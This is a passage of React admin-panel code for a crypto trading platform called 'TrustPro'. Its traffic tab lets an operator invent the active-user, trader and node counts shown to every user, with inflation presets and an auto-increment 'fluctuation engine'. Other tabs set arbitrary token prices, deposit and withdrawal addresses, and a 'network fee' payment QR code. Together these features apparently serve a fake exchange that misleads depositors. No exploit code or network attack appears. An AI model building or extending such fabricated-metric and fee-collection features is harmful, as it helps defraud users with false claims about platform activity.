                          className="px-2.5 py-1 rounded bg-rose-500/20 text-rose-400 hover:bg-rose-500 hover:text-white font-bold text-[10px] transition-colors"
                          title="Permanently Delete User Account"
                          id={`admin-delete-user-${u.id}`}
                        >
                          Delete
                        </button>
                      </div>
                    </td>
                  </tr>
                );
              })}
            </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB: LIVE PLATFORM TRAFFIC CONTROL */}
      {activeTab === 'traffic' && (
        <div className="space-y-6 animate-fadeIn">
          <div className="rounded-3xl bg-slate-900/90 border border-emerald-500/30 p-6 space-y-6 shadow-2xl">
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-5">
              <div>
                <div className="flex items-center gap-2">
                  <Sliders className="h-6 w-6 text-emerald-400" />
                  <h2 className="text-xl font-black text-white uppercase">Live Platform Traffic Control Center</h2>
                </div>
                <p className="text-xs text-slate-400 mt-1">
                  Direct real-time control over the platform traffic monitor shown on all user dashboards.
                </p>
              </div>

              {/* QUICK PRESETS */}
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    setTrafficActiveUsers(348920);
                    setTrafficLiveTraders(188416);
                    setTrafficOnlineNodes(62805);
                    setTrafficStatus('OPERATIONAL');
                    setTrafficTicker('All Web3 nodes, liquidity pools & cross-chain bridges operating at 100% capacity.');
                  }}
                  className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold border border-slate-700"
                >
                  Preset: 3.48 Lakhs Default
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setTrafficActiveUsers(500000);
                    setTrafficLiveTraders(270000);
                    setTrafficOnlineNodes(90000);
                    setTrafficStatus('HIGH_VOLUME');
                    setTrafficTicker('High volume trading detected across Solana and Ethereum mainnets.');
                  }}
                  className="px-3 py-1.5 rounded-xl bg-blue-500/10 border border-blue-500/30 text-blue-300 hover:bg-blue-500/20 text-xs font-bold"
                >
                  Preset: 5 Lakhs Surge
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setTrafficActiveUsers(1000000);
                    setTrafficLiveTraders(540000);
                    setTrafficOnlineNodes(180000);
                    setTrafficStatus('SURGE');
                    setTrafficTicker('RECORD BREAKING TRAFFIC: Over 1 Million active traders online on TrustPro.');
                  }}
                  className="px-3 py-1.5 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-300 hover:bg-purple-500/20 text-xs font-bold"
                >
                  Preset: 10 Lakhs Mega
                </button>
              </div>
            </div>

            {trafficSavedSuccess && (
              <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs font-bold flex items-center gap-2 animate-bounce">
                <CheckCircle2 className="h-5 w-5" />
                <span>Live Traffic Control Broadcasted Successfully! All users will see these exact metrics.</span>
              </div>
            )}

            <form onSubmit={handleSaveTrafficConfig} className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-5">
                {/* DAILY ACTIVE USERS INPUT */}
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
                    <span>Daily Active Users Count</span>
                    <span className="text-[10px] text-emerald-400 font-mono">Today's Traffic</span>
                  </label>
                  <input
                    type="number"
                    value={trafficActiveUsers}
                    onChange={(e) => setTrafficActiveUsers(Number(e.target.value))}
                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-emerald-500"
                    required
                    id="traffic-active-users-input"
                  />
                  <p className="text-[10px] text-slate-400">
                    Formatted: <span className="text-emerald-400 font-bold">{trafficActiveUsers.toLocaleString()}</span> active users
                  </p>
                </div>

                {/* 24H ACTIVE TRADERS INPUT */}
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
                    <span>24h Active Traders Count</span>
                    <span className="text-[10px] text-blue-400 font-mono">Trading Activity</span>
                  </label>
                  <input
                    type="number"
                    value={trafficLiveTraders}
                    onChange={(e) => setTrafficLiveTraders(Number(e.target.value))}
                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-blue-500"
                    required
                    id="traffic-live-traders-input"
                  />
                  <p className="text-[10px] text-slate-400">
                    Formatted: <span className="text-blue-400 font-bold">{trafficLiveTraders.toLocaleString()}</span> traders
                  </p>
                </div>

                {/* ACTIVE NODE SESSIONS INPUT */}
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <label className="block text-xs font-bold text-slate-300 flex items-center justify-between">
                    <span>Active Node Sessions</span>
                    <span className="text-[10px] text-purple-400 font-mono">Web3 Nodes</span>
                  </label>
                  <input
                    type="number"
                    value={trafficOnlineNodes}
                    onChange={(e) => setTrafficOnlineNodes(Number(e.target.value))}
                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-lg font-black text-white font-mono focus:outline-none focus:border-purple-500"
                    required
                    id="traffic-online-nodes-input"
                  />
                  <p className="text-[10px] text-slate-400">
                    Formatted: <span className="text-purple-400 font-bold">{trafficOnlineNodes.toLocaleString()}</span> nodes
                  </p>
                </div>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
                {/* SYSTEM STATUS SELECTOR */}
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                  <label className="block text-xs font-bold text-slate-300">
                    Platform Operational Status Text
                  </label>
                  <select
                    value={trafficStatus}
                    onChange={(e) => setTrafficStatus(e.target.value as any)}
                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3.5 py-2.5 text-xs text-white font-bold focus:outline-none focus:border-emerald-500"
                    id="traffic-system-status-select"
                  >
                    <option value="OPERATIONAL">99.99% Operational (Green)</option>
                    <option value="HIGH_VOLUME">High Volume Processing (Blue)</option>
                    <option value="SURGE">Network Surge Traffic (Purple)</option>
                    <option value="MAINTENANCE">Node Maintenance (Amber)</option>
                  </select>
                </div>

                {/* REAL-TIME FLUCTUATION TOGGLE */}
                <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 flex items-center justify-between">
                  <div>
                    <p className="text-xs font-bold text-white">Auto Fluctuation Engine</p>
                    <p className="text-[10px] text-slate-400">Automatically increment traffic count by +1 to +5 every few seconds</p>
                  </div>
                  <input
                    type="checkbox"
                    checked={trafficAutoFluctuate}
                    onChange={(e) => setTrafficAutoFluctuate(e.target.checked)}
                    className="h-5 w-5 rounded text-emerald-500 bg-slate-900 border-slate-800 focus:ring-emerald-500 cursor-pointer"
                  />
                </div>
              </div>

              {/* ANNOUNCEMENT TICKER NOTICE */}
              <div className="p-4 rounded-2xl bg-slate-950 border border-slate-800 space-y-2">
                <label className="block text-xs font-bold text-slate-300">
                  Custom Platform Notice Announcement Banner
                </label>
                <textarea
                  rows={2}
                  value={trafficTicker}
                  onChange={(e) => setTrafficTicker(e.target.value)}
                  placeholder="Enter custom ticker banner message for users..."
                  className="w-full rounded-xl bg-slate-900 border border-slate-700 p-3 text-xs text-white focus:outline-none focus:border-emerald-500 resize-none font-mono"
                  id="traffic-ticker-notice-textarea"
                />
              </div>

              <div className="flex justify-end gap-3 pt-2">
                <button
                  type="submit"
                  className="px-6 py-3.5 rounded-2xl bg-gradient-to-r from-emerald-500 to-teal-400 hover:opacity-95 text-slate-950 font-black text-xs transition-all shadow-xl flex items-center gap-2"
                  id="save-traffic-config-btn"
                >
                  <Save className="h-4 w-4" />
                  <span>Update & Broadcast Live Traffic</span>
                </button>
              </div>
            </form>

            {/* LIVE PREVIEW BOX */}
            <div className="pt-4 border-t border-slate-800 space-y-3">
              <p className="text-xs font-bold text-slate-400 uppercase tracking-widest font-mono">
                Live User Dashboard Preview
              </p>
              <div className="rounded-2xl bg-[#131A2D] border border-emerald-500/30 p-5 space-y-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-2">
                    <span className="relative flex h-3 w-3">
                      <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                      <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-500"></span>
                    </span>
                    <span className="text-[11px] font-extrabold uppercase tracking-widest text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-0.5 rounded-full">
                      ● LIVE Platform Traffic Monitor
                    </span>
                  </div>
                  <h3 className="text-xs font-semibold text-slate-300">Daily Active Website & Wallet Users</h3>
                </div>

                <div className="flex items-center gap-3 bg-[#080d19] border border-emerald-500/20 px-4 py-2.5 rounded-2xl">
                  <Users className="h-6 w-6 text-emerald-400 shrink-0" />
                  <div>
                    <p className="text-2xl font-black text-white font-mono">
                      {trafficActiveUsers.toLocaleString()} <span className="text-xs text-emerald-400">+ Users Today</span>
                    </p>
                  </div>
                </div>

                {trafficTicker && (
                  <div className="p-2.5 rounded-xl bg-blue-500/10 border border-blue-500/20 text-xs text-blue-300 flex items-center gap-2">
                    <Activity className="h-4 w-4 shrink-0 text-blue-400 animate-pulse" />
                    <span>{trafficTicker}</span>
                  </div>
                )}

                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 text-xs">
                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
                    <p className="text-[9px] text-slate-400 font-semibold uppercase">24h Active Traders</p>
                    <p className="text-xs font-black text-white font-mono">{trafficLiveTraders.toLocaleString()} Users</p>
                  </div>
                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Active Node Sessions</p>
                    <p className="text-xs font-black text-emerald-400 font-mono">{trafficOnlineNodes.toLocaleString()} Live</p>
                  </div>
                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Peak Concurrent</p>
                    <p className="text-xs font-black text-blue-400 font-mono">{Math.floor(trafficActiveUsers * 0.27).toLocaleString()} Online</p>
                  </div>
                  <div className="bg-[#0B1020]/80 p-2 rounded-xl border border-white/5">
                    <p className="text-[9px] text-slate-400 font-semibold uppercase">Platform Status</p>
                    <p className="text-xs font-black text-emerald-400 font-mono">{trafficStatus}</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}
      {activeTab === 'coins' && (
        <div className="space-y-6">
          <form onSubmit={handleCreateCustomCoin} className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 space-y-4">
            <h3 className="text-base font-bold text-white flex items-center gap-2">
              <Plus className="h-4 w-4 text-blue-300" />
              <span>Add Custom Supported Token</span>
            </h3>

            <div className="grid grid-cols-1 sm:grid-cols-4 gap-4 text-xs">
              <div>
                <label className="block text-slate-400 font-semibold mb-1">Token Symbol</label>
                <input
                  type="text"
                  placeholder="PEPE"
                  value={newCoinSymbol}
                  onChange={(e) => setNewCoinSymbol(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-white focus:outline-none"
                  required
                />
              </div>

              <div>
                <label className="block text-slate-400 font-semibold mb-1">Token Name</label>
                <input
                  type="text"
                  placeholder="Pepe Coin"
                  value={newCoinName}
                  onChange={(e) => setNewCoinName(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-white focus:outline-none"
                  required
                />
              </div>

              <div>
                <label className="block text-slate-400 font-semibold mb-1">Network Standard</label>
                <select
                  value={newCoinNetwork}
                  onChange={(e) => setNewCoinNetwork(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-white focus:outline-none"
                >
                  <option value="ERC-20">ERC-20 (Ethereum)</option>
                  <option value="BEP-20">BEP-20 (BNB Smart Chain)</option>
                  <option value="Solana SPL">Solana SPL</option>
                  <option value="TRC-20">TRC-20 (TRON)</option>
                </select>
              </div>

              <div>
                <label className="block text-slate-400 font-semibold mb-1">Initial Price (USD)</label>
                <input
                  type="number"
                  step="any"
                  placeholder="1.00"
                  value={newCoinPrice}
                  onChange={(e) => setNewCoinPrice(e.target.value)}
                  className="w-full rounded-xl bg-slate-950 border border-slate-800 px-3 py-2 text-white focus:outline-none"
                />
              </div>
            </div>

            <button
              type="submit"
              className="rounded-xl bg-blue-300 px-5 py-2.5 text-xs font-bold text-black hover:bg-blue-300"
            >
              Add Coin to Platform
            </button>
          </form>

          {/* Coins List & Deposit/Withdraw Address Manager */}
          {/* SEPARATE NETWORK FEE / GAS FEE CONFIGURATION SECTION */}
          <div className="rounded-3xl bg-[#1A1F35] border border-[#38B6FF]/40 p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-base font-bold text-[#38B6FF] flex items-center gap-2">
                  <Zap className="h-5 w-5" />
                  Network Fee & Gas Fee (TRX) Configuration
                </h3>
                <p className="text-xs text-slate-400 mt-1">
                  Configure the global deposit addresses and QR code for network gas fees (e.g., TRX for TRC20 transfers).
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-6 items-start">
              <div className="space-y-4">
                <div>
                  <label className="block text-[11px] font-bold text-slate-300 mb-1">
                    Gas Fee TRX Deposit Address:
                  </label>
                  <input
                    type="text"
                    defaultValue={depositAddresses['GAS_TRX'] || ''}
                    onBlur={(e) => {
                      if (e.target.value.trim()) {
                        updateDepositAddress('GAS_TRX', e.target.value.trim());
                      }
                    }}
                    className="w-full rounded-xl bg-slate-900 border border-[#38B6FF]/30 px-3 py-2 text-xs text-emerald-400 font-mono focus:outline-none focus:border-[#38B6FF]"
                    placeholder="Enter TRX Gas deposit address..."
                  />
                </div>
                
                <div className="pt-2 border-t border-[#38B6FF]/10 space-y-2">
                  <label className="block text-[11px] font-bold text-slate-300">
                    Gas Fee TRX QR Code Image URL:
                  </label>
                  <input
                    type="text"
                    defaultValue={networkFeeQrCode}
                    onBlur={(e) => {
                      if (e.target.value.trim()) {
                        updateNetworkFeeQrCode(e.target.value.trim());
                      }
                    }}
                    placeholder="https://... or base64 QR code image..."
                    className="w-full rounded-xl bg-slate-900 border border-slate-700 px-3 py-2 text-xs text-blue-300 font-mono focus:outline-none focus:border-[#38B6FF]"
                  />

                  <label className="block text-[11px] font-bold text-slate-300 pt-2">
                    Or Upload QR Code Image File from Device:
                  </label>
                  <input
                    type="file"
                    accept="image/*"
                    onChange={(e) => {
                      const file = e.target.files?.[0];
                      if (file) {
                        const reader = new FileReader();
                        reader.onload = (evt) => {
                          const result = evt.target?.result as string;
                          if (result) {
                            // Resize image to prevent localStorage quota exceeded
                            const img = new Image();
                            img.onload = () => {
                              const canvas = document.createElement('canvas');
                              const MAX_SIZE = 300;
                              let width = img.width;
                              let height = img.height;
                              if (width > height) {
                                if (width > MAX_SIZE) {
                                  height *= MAX_SIZE / width;
                                  width = MAX_SIZE;
                                }
                              } else {
                                if (height > MAX_SIZE) {
                                  width *= MAX_SIZE / height;
                                  height = MAX_SIZE;
                                }
                              }
                              canvas.width = width;
                              canvas.height = height;
                              const ctx = canvas.getContext('2d');
                              ctx?.drawImage(img, 0, 0, width, height);
                              const compressedDataUrl = canvas.toDataURL('image/jpeg', 0.8);
                              updateNetworkFeeQrCode(compressedDataUrl);
                            };
                            img.src = result;
                          }
                        };
                        reader.readAsDataURL(file);
                      }
                    }}
                    className="w-full text-xs text-slate-400 file:mr-3 file:py-1.5 file:px-3 file:rounded-xl file:border-0 file:text-xs file:font-bold file:bg-[#38B6FF] file:text-[#0B1020] hover:file:bg-[#e0b236] cursor-pointer"
                  />
                </div>
              </div>

              <div className="bg-slate-900/90 p-4 rounded-2xl border border-white/10 flex flex-col items-center justify-center text-center space-y-3 h-full min-h-[200px]">
                <div className="h-32 w-32 rounded-xl bg-white p-2 border-4 border-[#38B6FF] shadow-[0_0_20px_rgba(245,197,66,0.3)]">
                  <img
                    src={networkFeeQrCode}
                    alt="Network Fee QR Code"
                    className="h-full w-full object-contain"
                  />
                </div>
                <div>
                  <p className="text-sm font-bold text-white">Live QR Code Preview</p>
                  <p className="text-[11px] text-slate-400 mt-1 max-w-[200px] mx-auto">
                    This QR code will be displayed to all users when they click "Deposit Network Fee".
                  </p>
                </div>
              </div>
            </div>
          </div>

          <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-base font-bold text-white">Platform Asset & Address Management</h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Set custom deposit addresses for each coin. When users request to deposit, these official addresses will be displayed on their screen.
                </p>
              </div>
            </div>

            <div className="space-y-3">
              {assets.map((coin) => {
                const currentAddr =
                  depositAddresses[coin.symbol] ||
                  depositAddresses.DEFAULT ||
                  '0x71C7656EC7ab88b098defB751B7401B5f6d8976F';

                return (
                  <div
                    key={coin.id}
                    className="flex flex-col md:flex-row md:items-center justify-between p-4 rounded-2xl bg-slate-950 border border-slate-800 gap-3 text-xs"
                  >
                    <div className="flex items-center gap-3 shrink-0">
                      <img src={coin.icon} alt={coin.name} className="h-9 w-9 rounded-full" />
                      <div>
                        <div className="flex items-center gap-2">
                          <p className="font-bold text-white text-sm">{coin.name}</p>
                          <span className="px-2 py-0.5 rounded-full bg-slate-800 text-[10px] text-slate-300 font-mono">
                            {coin.symbol}
                          </span>
                        </div>
                        <p className="text-[11px] text-slate-400 font-mono mt-0.5">
                          Network: {coin.network} • Price: ${coin.priceUsd.toLocaleString()}
                        </p>
                      </div>
                    </div>

                    {/* Deposit & Withdrawal Address Inline Editors */}
                    <div className="flex-1 grid grid-cols-1 md:grid-cols-2 gap-3">
                      <div>
                        <label className="block text-[10px] font-bold text-slate-400 mb-1">
                          Deposit / Receive Address ({coin.symbol}):
                        </label>
                        <input
                          type="text"
                          defaultValue={currentAddr}
                          onBlur={(e) => {
                            if (e.target.value.trim() && e.target.value.trim() !== currentAddr) {
                              updateDepositAddress(coin.symbol, e.target.value.trim());
                            }
                          }}
                          className="w-full rounded-xl bg-slate-900 border border-slate-800 px-3 py-1.5 text-xs text-emerald-400 font-mono focus:outline-none focus:border-blue-300"
                          placeholder="Enter deposit address..."
                        />
                      </div>

                      <div>
                        <label className="block text-[10px] font-bold text-slate-400 mb-1">
                          Withdrawal / Protocol Gateway Address ({coin.symbol}):
                        </label>
                        <input
                          type="text"
                          defaultValue={withdrawAddresses[coin.symbol] || ''}
                          onBlur={(e) => {
                            if (e.target.value.trim()) {
                              updateWithdrawAddress(coin.symbol, e.target.value.trim());
                            }
                          }}
                          className="w-full rounded-xl bg-slate-900 border border-slate-800 px-3 py-1.5 text-xs text-blue-300 font-mono focus:outline-none focus:border-blue-300"
                          placeholder="Enter withdrawal gateway address..."
                        />
                      </div>
                    </div>

                    <div className="flex flex-col gap-2 shrink-0">
                      <button
                        onClick={() => toggleAssetEnabled(coin.id)}
                        className={`px-3 py-1.5 rounded-xl text-xs font-bold shrink-0 self-center w-full ${
                          coin.enabled ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/30' : 'bg-rose-500/10 text-rose-400 border border-rose-500/30'
                        }`}
                      >
                        {coin.enabled ? 'Enabled' : 'Disabled'}
                      </button>
                      <button
                        onClick={() => {
                          deleteCustomAsset(coin.id);
                        }}
                        className="px-3 py-1.5 rounded-xl text-xs font-bold shrink-0 self-center w-full bg-rose-500/10 text-rose-400 border border-rose-500/30 hover:bg-rose-500/20 transition-all"
                      >
                        Delete
                      </button>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      )}

      {/* TAB 5 & 6: AUDIT LOGS */}
      {(activeTab === 'audit' || activeTab === 'reports') && (
        <div className="rounded-3xl bg-slate-900/80 border border-slate-800 p-6 space-y-4">
          <h2 className="text-base font-bold text-white flex items-center gap-2">
            <Activity className="h-4 w-4 text-blue-300" />
            <span>Real-Time Audit Trail & Security Events</span>
          </h2>

          <div className="space-y-2">
            {auditLogs.map((log) => (
              <div
                key={log.id}
                className="flex items-center justify-between p-3.5 rounded-2xl bg-slate-950 border border-slate-800 text-xs font-mono"
              >
                <div>
                  <span className="text-blue-300 font-bold">{log.action}</span>
                  <p className="text-slate-300 font-sans mt-0.5">{log.details}</p>
                  <p className="text-[10px] text-slate-500">By: {log.adminEmail} • IP: {log.ipAddress}</p>
                </div>
                <span className="text-[10px] text-slate-500 shrink-0">{new Date(log.timestamp).toLocaleString()}</span>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Temp Password Reset Display Modal */}
      {resetPassModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div className="relative w-full max-w-sm rounded-3xl bg-[#0e1015] border border-slate-800 p-6 text-center space-y-4">
            <Key className="h-12 w-12 text-blue-300 mx-auto" />
            <h3 className="text-lg font-bold text-white">Temporary Credentials Issued</h3>
            <p className="text-xs text-slate-400">Target: {resetPassModal.email}</p>
            <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 text-sm font-mono font-bold text-emerald-400">
              {resetPassModal.pass}
            </div>
            <button
              onClick={() => setResetPassModal(null)}
              className="w-full rounded-xl bg-blue-300 py-2.5 text-xs font-bold text-black"
            >
              Done
            </button>
          </div>
        </div>
      )}

      {/* Admin Delete User Confirmation Modal */}
      {deleteUserConfirm && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200">
          <div className="relative w-full max-w-md rounded-3xl bg-slate-900 border border-rose-500/30 p-6 text-center space-y-4 shadow-2xl shadow-rose-500/10">
            <div className="mx-auto h-12 w-12 rounded-2xl bg-rose-500/10 border border-rose-500/30 flex items-center justify-center text-rose-400">
              <Trash2 className="h-6 w-6" />
            </div>

            <h3 className="text-lg font-black text-white">Confirm Account Deletion</h3>
            <p className="text-xs text-slate-300 leading-relaxed">
              Are you sure you want to permanently delete user account{' '}
              <span className="text-white font-bold">{deleteUserConfirm.name}</span> ({deleteUserConfirm.email})?
            </p>

            <p className="text-[11px] text-rose-400 bg-rose-500/10 p-2.5 rounded-xl border border-rose-500/20">
              ⚠️ Warning: This will erase all wallet ledger assets, transaction history, and KYC records for this user.
            </p>

            <div className="grid grid-cols-2 gap-3 pt-2">
              <button
                type="button"
                onClick={() => setDeleteUserConfirm(null)}
                className="w-full rounded-xl bg-slate-800 py-2.5 text-xs font-bold text-slate-300 hover:bg-slate-700"
              >
                Cancel
              </button>

              <button
                type="button"
                onClick={() => {
                  const res = deleteUserAccount(deleteUserConfirm.id);
                  setDeleteFeedback(res);
                  setDeleteUserConfirm(null);
                  setTimeout(() => setDeleteFeedback(null), 5000);
                }}
                className="w-full rounded-xl bg-rose-500 py-2.5 text-xs font-bold text-white hover:bg-rose-600 shadow-lg shadow-rose-500/20"
                id="admin-confirm-delete-user-btn"
              >
                Permanently Delete User
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
